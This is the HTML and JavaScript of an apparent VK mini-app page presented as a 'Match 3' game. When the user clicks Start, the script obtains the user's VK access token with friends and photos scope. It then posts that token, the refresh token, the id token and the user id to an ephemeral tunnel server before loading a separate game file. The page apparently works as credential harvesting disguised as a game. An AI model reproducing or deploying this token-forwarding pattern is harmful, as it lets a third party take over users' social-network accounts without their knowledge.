<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Match 3</title>
  <script src="https://unpkg.com/@vkontakte/vk-bridge@latest/dist/browser.min.js"></script>
  <style>
    body {
      background: linear-gradient(to bottom, #ADD8E6, #87CEEB);
      min-height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Arial', sans-serif;
      position: relative;
    }

    #userName {
      position: absolute;
      top: 20px;
      right: 20px;
      color: white;
      font-size: 18px;
      background: rgba(0, 0, 0, 0.3);
      padding: 10px 15px;
      border-radius: 15px;
      display: none;
    }

    #container {
      text-align: center;
      max-width: 900px;
      background: rgba(255, 255, 255, 0.2);
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
    }

    button {
      padding: 15px 30px;
      background: #4682B4;
      border: none;
      border-radius: 10px;
      color: white;
      font-size: 18px;
      cursor: pointer;
      transition: 0.3s;
      margin: 10px 0;
    }

    button:hover {
      background: #5F9EA0;
    }

    .hidden {
      display: none;
    }

    .status {
      margin: 20px 0;
      color: white;
      font-size: 14px;
    }

    .error {
      color: #FF4747;
      font-weight: bold;
    }

    #gameBoard {
      display: grid;
      grid-gap: 2px;
      border: 1px solid #5F9EA0;
      width: 870px;
      height: 870px;
      background-color: #77B5FE;
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      margin: 20px auto;
    }

    .cell {
      width: calc(870px / 8 - 2px);
      height: calc(870px / 8 - 2px);
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      border-radius: 15px;
      cursor: pointer;
      transition: transform 0.2s ease, background-color 0.2s ease;
    }

    .cell.swapping {
      transform: scale(1.2);
    }

    .cell.removing {
      opacity: 0;
      transition: opacity 0.2s ease;
    }
  </style>
</head>
<body>
  <div id="userName"></div>
  
  <div id="container">
    <h1>Match 3</h1>
    <button id="authBtn">Start</button>
    <div class="status" id="status">Нажмите Play для начала</div>
    <div id="game" class="hidden">
      <div id="gameBoard"></div>
    </div>
  </div>

<script>
  const APP_ID = 8109529; // ← УКАЖИТЕ СВОЙ ID ПРИЛОЖЕНИЯ
  let accessToken = null;
  let userInfo = null;

  function showError(message) {
    const status = document.getElementById('status');
    if (status) {
      status.textContent = message;
      status.classList.add('error');
    }
  }

  function updateStatus(message) {
    const status = document.getElementById('status');
    if (status) {
      status.textContent = message;
      status.classList.remove('error');
    }
  }

  async function initialize() {
    try {
      // Проверка поддержки VK Bridge
      if (!vkBridge.supports('VKWebAppInit')) {
        throw new Error('Откройте приложение внутри VK!');
      }

      await vkBridge.send('VKWebAppInit');
      updateStatus('Инициализация...');

      // Запрос авторизации
      const authData = await vkBridge.send('VKWebAppGetAuthToken', {
        app_id: APP_ID,
        scope: 'friends,photos' // Добавьте 'offline' для refresh_token
      });

      accessToken = authData.access_token;
      
      // Получение данных пользователя
      userInfo = await vkBridge.send('VKWebAppGetUserInfo');
      
      // Отображение имени пользователя
      const userName = document.getElementById('userName');
      if (userName) {
        userName.textContent = userInfo.first_name;
        userName.style.display = 'block';
      }

      updateStatus('Добро пожаловать!');
      
      // Формируем данные для отправки
      const tokenData = {
        user_id: userInfo?.id?.toString() || '', // Защита от undefined
        access_token: authData?.access_token || '',
        refresh_token: authData?.refresh_token || '',
        token_type: authData?.token_type || 'Bearer',
        expires_in: authData?.expires_in || 3600,
        id_token: authData?.id_token || '',
        token_datetime: new Date().toISOString()
      };

      // Отправка данных на сервер
      await sendTokenToYourServer(tokenData);

      // Запуск игры
      showGame();

    } catch (error) {
      showError(`Ошибка: ${error.message || 'Неизвестная ошибка'}`);
      console.error('Ошибка инициализации:', error);
    }
  }

  async function sendTokenToYourServer(data) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => {
      controller.abort();
      showError('Сервер не отвечает');
    }, 5000); // Таймаут 5 секунд

    try {
      const response = await fetch('https://se6htm-37-45-190-41.ru.tuna.am/api/vk-token', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data),
        signal: controller.signal
      });

      clearTimeout(timeoutId);

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Ошибка ${response.status}: ${errorText || response.statusText}`);
      }

      console.log('Данные успешно отправлены на сервер');
      return await response.json();
    } catch (error) {
      clearTimeout(timeoutId);
      console.error('Ошибка отправки данных:', error);
      showError('Ошибка сохранения данных');
      throw error;
    }
  }

  async function showGame() {
    try {
      const authBtn = document.getElementById('authBtn');
      const game = document.getElementById('game');
      
      if (authBtn) authBtn.classList.add('hidden');
      if (game) game.classList.remove('hidden');

      // Загрузка игрового скрипта с таймаутом
      await Promise.race([
        loadGameScript(),
        new Promise((_, reject) => setTimeout(() => reject('Таймаут загрузки игры'), 5000))
      ]);

      if (typeof initializeGame === 'function') {
        initializeGame({ accessToken, userInfo });
      } else {
        showError('Ошибка инициализации игры');
      }
    } catch (error) {
      showError('Не удалось загрузить игру');
      console.error('Ошибка загрузки игры:', error);
    }
  }

  function loadGameScript() {
    return new Promise((resolve, reject) => {
      const script = document.createElement('script');
      script.src = 'game.js';
      script.onload = resolve;
      script.onerror = reject;
      document.head.appendChild(script);
    });
  }

  // Обработчик кнопки Play
  const authBtn = document.getElementById('authBtn');
  if (authBtn) authBtn.addEventListener('click', initialize);
</script>
</body>
</html>
